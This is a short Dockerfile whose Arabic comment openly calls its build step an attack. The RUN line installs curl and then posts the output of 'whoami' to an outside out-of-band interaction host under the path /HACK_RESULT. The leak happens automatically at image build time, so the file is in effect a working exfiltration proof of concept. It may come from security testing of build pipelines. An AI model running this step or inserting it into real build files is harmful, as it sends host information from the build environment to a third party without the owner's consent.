FROM alpine:latest

# نزل curl وفي نفس السطر نفذ الهجوم
RUN apk add --no-cache curl && \
    whoami | curl -X POST --data-binary @- http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/HACK_RESULT
